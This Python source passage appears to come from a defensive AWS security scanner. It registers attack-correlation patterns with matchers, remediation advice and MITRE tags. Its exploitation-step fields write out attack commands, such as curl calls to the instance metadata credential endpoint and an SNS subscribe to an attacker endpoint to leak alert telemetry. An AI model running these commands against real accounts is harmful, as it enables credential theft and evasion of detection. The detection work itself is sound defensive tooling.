def _match_lambda_env_secret_leak(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    vulns_evidence = (
        evidence_by_skill.get("vulns", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    env_items = _extract_items(vulns_evidence.get("lambda-environment-variables"))
    return any(
        isinstance(item, dict)
        and isinstance(item.get("PotentialSecretKeys"), list)
        and len(item.get("PotentialSecretKeys", [])) > 0
        for item in env_items
    )


def _lambda_env_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker gains read capability over Lambda configuration metadata",
        "Extracts secret-like environment variable keys and values",
        "Reuses exposed credentials to access downstream AWS services",
    ]


def _lambda_env_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Move secrets from Lambda environment variables to Secrets Manager",
        "Encrypt secret retrieval with KMS and runtime least privilege",
        "Rotate any potentially exposed credentials",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="vulns_lambda_env_secret_leakage",
        name="Lambda Environment Secret Leakage",
        description="Lambda env vars containing secrets can expose credentials.",
        severity="High",
        skills_required=["vulns"],
        matcher=_match_lambda_env_secret_leak,
        attack_path_generator=_lambda_env_attack_path,
        remediation_generator=_lambda_env_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0006"],
            mitre_attack_techniques=["T1552.007"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate Lambda configuration and inspect env vars",
                "Validate scope of leaked credentials",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="20 minutes",
        ),
        amplification_factor=1.35,
    )
)


def _match_opensearch_public_exposure(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    exposure_evidence = (
        evidence_by_skill.get("exposure", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    domains = _extract_items(exposure_evidence.get("elasticsearch-domains"))
    for d in domains:
        endpoint = d.get("Endpoint")
        policy = d.get("AccessPolicies")
        if (
            isinstance(endpoint, str)
            and endpoint
            and (
                (isinstance(policy, str) and '"Principal":"*"' in policy.replace(" ", ""))
                or (isinstance(policy, dict) and _policy_has_wildcard_principal(policy))
            )
        ):
            return True
    return False


def _opensearch_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker discovers exposed OpenSearch/Elasticsearch endpoint",
        "Interacts with index APIs where policy permits broad access",
        "Extracts indexed sensitive data or tampers with stored documents",
    ]


def _opensearch_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict domain access policies to approved principals only",
        "Place domains in private VPC and disable public exposure",
        "Enable fine-grained access control and audit logging",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="exposure_opensearch_public_data_exposure",
        name="Public OpenSearch Data Exposure",
        description="Public OpenSearch domains with broad policies can leak indexed data.",
        severity="Critical",
        skills_required=["exposure"],
        matcher=_match_opensearch_public_exposure,
        attack_path_generator=_opensearch_attack_path,
        remediation_generator=_opensearch_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0009"],
            mitre_attack_techniques=["T1530"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Query domain endpoint and enumerate accessible indices",
                "Attempt reads/writes based on policy scope",
            ],
            tools_required=["curl"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="10 minutes",
        ),
        amplification_factor=1.5,
    )
)


def _match_user_data_secret_exposure(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    vulns_evidence = (
        evidence_by_skill.get("vulns", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    entries = _extract_items(vulns_evidence.get("ec2-user-data"))
    for entry in entries:
        flags = entry.get("ContainsSecrets")
        if isinstance(flags, dict) and any(bool(v) for v in flags.values()):
            return True
    return False


def _user_data_secret_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker obtains read access to user-data or instance bootstrap scripts",
        "Extracts hardcoded credentials/tokens from bootstrap content",
        "Authenticates to AWS APIs or downstream services with exposed secrets",
        "Escalates access and exfiltrates sensitive data",
    ]


def _user_data_secret_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Remove static credentials from EC2 user-data scripts",
        "Use IAM roles and short-lived credentials instead of embedded secrets",
        "Store sensitive values in Secrets Manager or SSM Parameter Store",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="vulns_ec2_user_data_secret_exposure",
        name="EC2 User-Data Secret Exposure",
        description="Hardcoded secrets in user-data can enable credential compromise.",
        severity="Critical",
        skills_required=["vulns"],
        matcher=_match_user_data_secret_exposure,
        attack_path_generator=_user_data_secret_attack_path,
        remediation_generator=_user_data_secret_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0006"],
            mitre_attack_techniques=["T1552.001"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Inspect EC2 user-data scripts for exposed tokens/keys",
                "Validate leaked credential scope with sts:GetCallerIdentity",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="15 minutes",
        ),
        amplification_factor=1.45,
    )
)


def _match_api_gateway_without_waf(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    exp_evidence = (
        evidence_by_skill.get("exposure", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    stages = _extract_items(exp_evidence.get("api-gateway-stages"))
    return any(
        isinstance(s, dict) and isinstance(s.get("InvokeUrl"), str) and not bool(s.get("HasWAF"))
        for s in stages
    )


def _api_gateway_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker enumerates internet-exposed API Gateway stage endpoints",
        "Performs endpoint fuzzing and input abuse attempts",
        "Exploits missing compensating controls without WAF protections",
    ]


def _api_gateway_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Associate APIs with WAF and managed rule sets",
        "Enforce strong authN/authZ and request validation",
        "Limit attack surface by disabling unused stages and routes",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="exposure_api_gateway_no_waf",
        name="Public API Gateway Without WAF",
        description="Internet-facing API stages without WAF increase exploitability.",
        severity="High",
        skills_required=["exposure"],
        matcher=_match_api_gateway_without_waf,
        attack_path_generator=_api_gateway_attack_path,
        remediation_generator=_api_gateway_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001"],
            mitre_attack_techniques=["T1190"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate stage URLs from execute-api endpoints",
                "Run endpoint fuzzing and auth bypass checks",
            ],
            tools_required=["curl", "ffuf"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="45 minutes",
        ),
        amplification_factor=1.3,
    )
)


def _match_resource_policy_wildcard(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    iam_evidence = evidence_by_skill.get("iam", {}) if isinstance(evidence_by_skill, dict) else {}
    policies_doc = iam_evidence.get("resource-based-policies") or {}
    if not isinstance(policies_doc, dict):
        return False
    for svc in ("s3", "lambda", "sqs", "sns"):
        entries = policies_doc.get(svc, [])
        if not isinstance(entries, list):
            continue
        for entry in entries:
            if not isinstance(entry, dict):
                continue
            if _policy_has_wildcard_principal(entry.get("Policy")):
                return True
    return False


def _resource_policy_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker identifies resource policy with wildcard principal",
        "Invokes cross-account access path against exposed resource",
        "Reads/modifies queue/topic/function or bucket content",
    ]


def _resource_policy_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Replace wildcard principals with explicit trusted principals",
        "Add strict condition keys (SourceArn/SourceAccount) where applicable",
        "Continuously audit resource policies for cross-account exposure",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="iam_resource_policy_wildcard_principal",
        name="Wildcard Principal in Resource Policy",
        description="Wildcard principals in resource policies can permit cross-account abuse.",
        severity="Critical",
        skills_required=["iam"],
        matcher=_match_resource_policy_wildcard,
        attack_path_generator=_resource_policy_attack_path,
        remediation_generator=_resource_policy_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0003"],
            mitre_attack_techniques=["T1190", "T1098"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate resource policies and detect wildcard principals",
                "Validate cross-account invocation/read permissions",
            ],
            tools_required=["aws-cli", "jq"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="20 minutes",
        ),
        amplification_factor=1.45,
    )
)


def _match_nat_egress_pivot(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    net_evidence = (
        evidence_by_skill.get("network", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    nats = _extract_items(net_evidence.get("nat-gateway-routes"))
    return any(
        isinstance(n, dict)
        and n.get("State") == "available"
        and isinstance(n.get("AssociatedRouteTables"), list)
        and len(n.get("AssociatedRouteTables", [])) > 0
        for n in nats
    )


def _nat_pivot_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Compromise private workload in subnet routed to NAT Gateway",
        "Use NAT egress path for command-and-control and data exfiltration",
        "Blend outbound traffic with expected internet egress",
    ]


def _nat_pivot_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict egress with VPC endpoints, firewall controls, and explicit deny rules",
        "Segment sensitive workloads into subnets without direct internet egress",
        "Monitor unusual outbound traffic patterns from private subnets",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="network_nat_egress_pivoting",
        name="NAT Gateway Egress Pivoting",
        description="NAT-routed private subnets can facilitate stealthy outbound pivoting.",
        severity="Medium",
        skills_required=["network"],
        matcher=_match_nat_egress_pivot,
        attack_path_generator=_nat_pivot_attack_path,
        remediation_generator=_nat_pivot_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0011"],
            mitre_attack_techniques=["T1041"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Identify route tables associated with NAT gateways",
                "Validate unrestricted outbound destinations",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="60 minutes",
        ),
        amplification_factor=1.2,
    )
)


def _match_public_api_plus_overpriv_iam(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    iam_findings = findings_by_skill.get("iam", [])
    has_overpriv = any(_is_overprivileged_iam_finding(f) for f in iam_findings)
    if not has_overpriv:
        return False

    exp_evidence = (
        evidence_by_skill.get("exposure", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    lambda_urls = _extract_items(exp_evidence.get("lambda-function-urls"))
    api_stages = _extract_items(exp_evidence.get("api-gateway-stages"))

    has_public_lambda = any(bool(x.get("IsPublic")) for x in lambda_urls if isinstance(x, dict))
    has_public_api = any(
        isinstance(x.get("InvokeUrl"), str) and not bool(x.get("HasWAF"))
        for x in api_stages
        if isinstance(x, dict)
    )
    return has_public_lambda or has_public_api


def _public_api_overpriv_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker targets internet-facing API/Lambda endpoint",
        "Obtains or abuses over-privileged IAM credentials/tokens",
        "Uses excessive permissions for lateral movement and data access",
    ]


def _public_api_overpriv_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Reduce IAM privileges for identities reachable from public application paths",
        "Require auth and WAF controls on internet-facing endpoints",
        "Apply runtime and identity guardrails with SCPs and least privilege",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="exposure_iam_public_api_privilege_escalation",
        name="Public API + Overprivileged IAM Escalation Chain",
        description="Public entry points combined with excessive IAM rights increase blast radius.",
        severity="Critical",
        skills_required=["exposure", "iam"],
        matcher=_match_public_api_plus_overpriv_iam,
        attack_path_generator=_public_api_overpriv_attack_path,
        remediation_generator=_public_api_overpriv_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0004", "TA0008"],
            mitre_attack_techniques=["T1190", "T1078.004", "T1021"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate public API/Lambda endpoints",
                "Map runtime IAM permissions and identify wildcard actions",
                "Abuse identity to reach additional AWS resources",
            ],
            tools_required=["aws-cli", "curl"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="90 minutes",
        ),
        amplification_factor=1.5,
    )
)


def _match_imdsv1_ssrf_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    vulns_evidence = (
        evidence_by_skill.get("vulns", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    imds_doc = vulns_evidence.get("imds-configuration") or {}
    instances = imds_doc.get("instances", []) if isinstance(imds_doc, dict) else []
    if not isinstance(instances, list):
        return False
    return any(isinstance(i, dict) and i.get("VulnerableToSSRF") for i in instances)


def _imds_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker gains SSRF primitive in an internet-facing workload",
        "Requests IMDSv1 metadata endpoint from compromised runtime",
        "Extracts temporary credentials from instance metadata",
        "Uses stolen credentials for lateral movement in AWS account",
    ]


def _imds_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Enforce IMDSv2 by setting HttpTokens=require on all EC2 instances",
        "Set restrictive metadata hop limit where applicable",
        "Rotate any potentially exposed credentials and monitor CloudTrail",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="vulns_imdsv1_ssrf_credential_theft",
        name="Credential Theft via IMDSv1 SSRF",
        description="IMDSv1-enabled instances can expose credentials when SSRF exists.",
        severity="High",
        skills_required=["vulns"],
        matcher=_match_imdsv1_ssrf_chain,
        attack_path_generator=_imds_attack_path,
        remediation_generator=_imds_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0006"],
            mitre_attack_techniques=["T1190", "T1552.005"],
            observed_in_wild=True,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>",
            ],
            tools_required=["curl", "aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="20 minutes",
        ),
        amplification_factor=1.4,
    )
)


def _match_public_lambda_url(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    exp_evidence = (
        evidence_by_skill.get("exposure", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    fn_doc = exp_evidence.get("lambda-function-urls") or {}
    urls = fn_doc.get("function_urls", []) if isinstance(fn_doc, dict) else []
    if not isinstance(urls, list):
        return False
    return any(isinstance(u, dict) and u.get("IsPublic") for u in urls)


def _lambda_url_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker enumerates exposed Lambda Function URLs",
        "Invokes unauthenticated endpoint repeatedly",
        "Abuses function logic to access internal services or data",
    ]


def _lambda_url_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Set Lambda Function URL AuthType to AWS_IAM",
        "Protect function behind API Gateway + WAF where public access is required",
        "Implement strict input validation and runtime least privilege",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="exposure_public_lambda_url_abuse",
        name="Public Lambda URL Abuse",
        description="Unauthenticated Lambda Function URLs increase initial access risk.",
        severity="High",
        skills_required=["exposure"],
        matcher=_match_public_lambda_url,
        attack_path_generator=_lambda_url_attack_path,
        remediation_generator=_lambda_url_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001"],
            mitre_attack_techniques=["T1190"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "curl -i https://<function-id>.lambda-url.<region>.on.aws/",
                "Replay crafted payloads against unauthenticated endpoint",
            ],
            tools_required=["curl"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="15 minutes",
        ),
        amplification_factor=1.3,
    )
)


def _match_tgw_lateral_movement(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    net_evidence = (
        evidence_by_skill.get("network", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    tgw_doc = net_evidence.get("transit-gateway-topology") or {}
    attachments = tgw_doc.get("attachments", []) if isinstance(tgw_doc, dict) else []
    if not isinstance(attachments, list):
        return False
    attached_vpcs = {
        a.get("ResourceId")
        for a in attachments
        if isinstance(a, dict) and isinstance(a.get("ResourceId"), str)
    }
    return len(attached_vpcs) >= 2


def _tgw_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Compromise workload in lower-trust VPC",
        "Enumerate Transit Gateway routes and reachable CIDRs",
        "Pivot to connected VPCs through propagated routes",
        "Access sensitive workloads in production segments",
    ]


def _tgw_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Segment Transit Gateway route tables by environment and trust level",
        "Deny east-west traffic by default and allow only required flows",
        "Continuously review TGW attachments and route propagations",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="network_tgw_lateral_movement",
        name="Lateral Movement via Transit Gateway",
        description="Transit Gateway topology may allow pivoting across VPC boundaries.",
        severity="High",
        skills_required=["network"],
        matcher=_match_tgw_lateral_movement,
        attack_path_generator=_tgw_attack_path,
        remediation_generator=_tgw_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0008"],
            mitre_attack_techniques=["T1021"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws ec2 describe-transit-gateway-attachments",
                "aws ec2 search-transit-gateway-routes --transit-gateway-route-table-id <id>",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="30 minutes",
        ),
        amplification_factor=1.35,
    )
)


def _match_exposure_api_unauth_mutation_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    exposure_findings = findings_by_skill.get("exposure", [])
    ids = {f.id for f in exposure_findings}
    return "EXP-021" in ids or "EXP-022" in ids


def _exposure_api_unauth_mutation_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker discovers public API Gateway endpoint and stage",
        "Invokes unauthenticated mutating route (POST/PUT/PATCH/DELETE or ANY/proxy)",
        "Abuses business logic to alter data/state and pivot into internal workflows",
    ]


def _exposure_api_unauth_mutation_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Require strong authorizers for all mutating and wildcard routes",
        "Avoid ANY/proxy routes without strict auth and input validation",
        "Enforce least privilege at route, integration, and backend IAM layers",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="exposure_api_unauthenticated_mutation_chain",
        name="API Unauthenticated Mutation Chain",
        description="Unauthenticated mutating API routes enable direct business-logic abuse and unauthorized state changes.",
        severity="Critical",
        skills_required=["exposure"],
        matcher=_match_exposure_api_unauth_mutation_chain,
        attack_path_generator=_exposure_api_unauth_mutation_attack_path,
        remediation_generator=_exposure_api_unauth_mutation_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0003"],
            mitre_attack_techniques=["T1190", "T1565"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate API stages and routes",
                "Invoke unauthenticated mutating endpoints",
                "Manipulate backend state and extract side-channel data",
            ],
            tools_required=["curl", "aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="20 minutes",
        ),
        amplification_factor=1.5,
    )
)


def _match_alerting_sns_subscription_exfil_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    alert_findings = findings_by_skill.get("alerting", [])
    ids = {f.id for f in alert_findings}
    return bool({"ALRT-023", "ALRT-024"}.intersection(ids))


def _alerting_sns_subscription_exfil_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker identifies permissive SNS alert topic subscription controls",
        "Adds unauthorized endpoint subscription to capture alert payloads",
        "Uses leaked security telemetry to evade detection and incident response",
    ]


def _alerting_sns_subscription_exfil_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict sns:Subscribe and subscription protocols on alert topics",
        "Continuously review and alert on unexpected subscriptions",
        "Use approved, controlled subscriber endpoints only",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="alerting_sns_subscription_exfiltration_chain",
        name="Alerting SNS Subscription Exfiltration Chain",
        description="Permissive subscription controls on alert topics can leak security telemetry to unauthorized endpoints.",
        severity="High",
        skills_required=["alerting"],
        matcher=_match_alerting_sns_subscription_exfil_chain,
        attack_path_generator=_alerting_sns_subscription_exfil_attack_path,
        remediation_generator=_alerting_sns_subscription_exfil_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0009", "TA0005"],
            mitre_attack_techniques=["T1020", "T1562"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws sns list-topics",
                "aws sns subscribe --topic-arn <topic> --protocol https --notification-endpoint <attacker-endpoint>",
                "Observe alert traffic out-of-band",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="20 minutes",
        ),
        amplification_factor=1.45,
    )
)


def _match_alerting_sns_publish_spoofing_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    alert_findings = findings_by_skill.get("alerting", [])
    return any(f.id == "ALRT-022" for f in alert_findings)


def _alerting_sns_publish_spoofing_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker abuses broad sns:Publish permissions on alert topics",
        "Injects noisy/false alerts to desensitize monitoring workflows",
        "Masks malicious activity during detection fatigue window",
    ]


def _alerting_sns_publish_spoofing_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Restrict sns:Publish to explicit service principals and expected sources",
        "Enforce aws:SourceArn/aws:SourceAccount in topic policies",
        "Alert on unusual publish patterns and sender identities",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="alerting_sns_publish_spoofing_chain",
        name="Alerting SNS Publish Spoofing Chain",
        description="Broad publish permissions on alert topics allow spoofing/noise injection that degrades detection quality.",
        severity="Critical",
        skills_required=["alerting"],
        matcher=_match_alerting_sns_publish_spoofing_chain,
        attack_path_generator=_alerting_sns_publish_spoofing_attack_path,
        remediation_generator=_alerting_sns_publish_spoofing_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0005"],
            mitre_attack_techniques=["T1562"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "aws sns publish --topic-arn <topic> --message <noise>",
                "Generate sustained alert noise to obscure true incidents",
                "Execute malicious actions during alert fatigue",
            ],
            tools_required=["aws-cli"],
            exploitation_complexity="Low",
            estimated_time_to_compromise="15 minutes",
        ),
        amplification_factor=1.5,
    )
)


def _match_vulns_userdata_to_iam_pivot(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    vulns_findings = findings_by_skill.get("vulns", [])
    iam_findings = findings_by_skill.get("iam", [])
    has_userdata_secret = any(f.id == "VULN-023" for f in vulns_findings)
    has_iam_escalation_surface = any(
        _is_overprivileged_iam_finding(f) or f.id == "IAM-008" for f in iam_findings
    )
    return has_userdata_secret and has_iam_escalation_surface


def _vulns_userdata_to_iam_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker obtains credential material from EC2 user-data bootstrap scripts",
        "Reuses exposed secrets or tokens to authenticate into AWS APIs",
        "Pivots through over-privileged IAM permissions for lateral movement",
    ]


def _vulns_userdata_to_iam_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Remove secrets from EC2 user-data and rotate exposed credentials",
        "Use Secrets Manager/SSM Parameter Store for bootstrap secret delivery",
        "Reduce IAM privileges attached to identities reachable from compute bootstrap",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="vulns_ec2_userdata_iam_pivot_chain",
        name="EC2 User-Data Secret to IAM Pivot Chain",
        description="Secrets exposed in EC2 user-data combined with over-privileged IAM increase lateral movement risk.",
        severity="Critical",
        skills_required=["vulns", "iam"],
        matcher=_match_vulns_userdata_to_iam_pivot,
        attack_path_generator=_vulns_userdata_to_iam_attack_path,
        remediation_generator=_vulns_userdata_to_iam_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0006", "TA0008"],
            mitre_attack_techniques=["T1552", "T1078.004"],
            observed_in_wild=False,
            exploit_maturity="Functional",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Read user-data from compromised instance metadata or host artifacts",
                "Extract keys/tokens and call aws sts get-caller-identity",
                "Enumerate and abuse reachable IAM permissions",
            ],
            tools_required=["aws-cli", "curl"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="40 minutes",
        ),
        amplification_factor=1.6,
    )
)


def _match_vulns_lambda_secret_to_public_api_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    vulns_findings = findings_by_skill.get("vulns", [])
    has_lambda_secret = any(f.id in {"VULN-024", "VULN-025"} for f in vulns_findings)
    if not has_lambda_secret:
        return False

    exp_evidence = (
        evidence_by_skill.get("exposure", {}) if isinstance(evidence_by_skill, dict) else {}
    )
    fn_doc = exp_evidence.get("lambda-function-urls") or {}
    urls = fn_doc.get("function_urls", []) if isinstance(fn_doc, dict) else []
    if not isinstance(urls, list):
        return False
    return any(isinstance(x, dict) and bool(x.get("IsPublic")) for x in urls)


def _vulns_lambda_secret_to_public_api_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker reaches publicly exposed Lambda/API entrypoint",
        "Obtains or abuses leaked runtime secrets from Lambda environment configuration",
        "Uses recovered credentials/tokens to access internal AWS resources",
    ]


def _vulns_lambda_secret_to_public_api_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Eliminate plaintext secrets from Lambda environment variables",
        "Restrict public Lambda/API exposure with auth and WAF controls",
        "Rotate exposed credentials and enforce scoped runtime IAM roles",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="vulns_lambda_secret_public_entrypoint_chain",
        name="Lambda Secret Exposure + Public Entrypoint Chain",
        description="Public Lambda entrypoints combined with leaked runtime secrets increase direct exploitation impact.",
        severity="High",
        skills_required=["vulns", "exposure"],
        matcher=_match_vulns_lambda_secret_to_public_api_chain,
        attack_path_generator=_vulns_lambda_secret_to_public_api_attack_path,
        remediation_generator=_vulns_lambda_secret_to_public_api_remediation,
        threat_context=ThreatContext(
            mitre_attack_tactics=["TA0001", "TA0006", "TA0008"],
            mitre_attack_techniques=["T1190", "T1552", "T1078.004"],
            observed_in_wild=False,
            exploit_maturity="Proof-of-Concept",
        ),
        exploitability=ExploitabilityInfo(
            exploitation_steps=[
                "Enumerate public Lambda function URLs",
                "Trigger error paths and inspect runtime leakage vectors",
                "Reuse leaked credentials to access AWS APIs",
            ],
            tools_required=["curl", "aws-cli"],
            exploitation_complexity="Medium",
            estimated_time_to_compromise="60 minutes",
        ),
        amplification_factor=1.35,
    )
)


def _match_vulns_s3_ransomware_chain(
    findings_by_skill: Dict[str, List[Finding]],
    resource_index: Dict[str, List[Finding]],
    evidence_by_skill: Dict[str, Any],
) -> bool:
    exposure_findings = findings_by_skill.get("exposure", [])
    iam_findings = findings_by_skill.get("iam", [])
    has_s3_recoverability_gap = any(f.id in {"EXP-001", "EXP-014"} for f in exposure_findings)
    has_destructive_iam = any(f.id in {"IAM-038", "IAM-039"} for f in iam_findings)
    return has_s3_recoverability_gap and has_destructive_iam


def _vulns_s3_ransomware_attack_path(_: Dict[str, Any]) -> List[str]:
    return [
        "Attacker gains write/delete capability over S3 data paths",
        "Targets buckets lacking strong recoverability controls (e.g., no versioning)",
        "Overwrites/deletes objects to enforce business-impacting data denial",
    ]


def _vulns_s3_ransomware_remediation(_: Dict[str, Any]) -> List[str]:
    return [
        "Enable S3 versioning and additional immutable backup controls for critical buckets",
        "Restrict destructive IAM permissions (delete/detach/policy mutation)",
        "Monitor anomalous object overwrite/delete bursts and key security changes",
    ]


PATTERN_REGISTRY.register(
    DynamicCorrelationPattern(
        id="exposure_s3_ransomware_impact_chain",
        name="S3 Ransomware Impact Chain",
        description="S3 recoverability gaps plus destructive IAM capabilities increase ransomware impact.",
